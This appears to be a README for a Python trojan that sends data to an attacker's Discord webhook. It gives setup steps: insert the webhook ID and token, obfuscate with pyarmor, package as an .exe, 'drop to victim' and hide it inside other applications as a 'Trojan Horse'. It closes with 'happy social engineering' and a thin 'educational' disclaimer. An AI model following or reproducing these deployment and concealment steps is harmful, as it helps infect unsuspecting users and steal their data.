### USING :
* [PYTHON]

### INSTRUCTIONS :
the way i've setup my webhook is an interesting system, but it's fairly easy to understand:

"whID" = Webhook ID

"whAT" = Webhook Token/Authorization Token

these are the two most important variables in the script, in-fact they're the only ones you'll have to configure.

example: https//discordcom/api/webhooks/**00000000**/**qwertyuiop**

the variables are highlighted, those are the one's youll want to find in your own webhook.

once you've found those variables, carefully remove "webhook-id" & "webhook-token" & replace them with your own,

once that's complete > the script is fully built! 

you'll either want to pack the script with pyarmor, & then exe it > or .exe it, either one.

drop to victim, and wait for them to run : the script is ideal to be placed into other applications, much like a "Trojan Horse" .

happy social engineering ! disclaimer: educational purposed

if you appreciate my work, pass a follow/star 

### PY > EXE :

cmd prompt > "cd path/where/python-file/is"

```pip install pyinstaller```
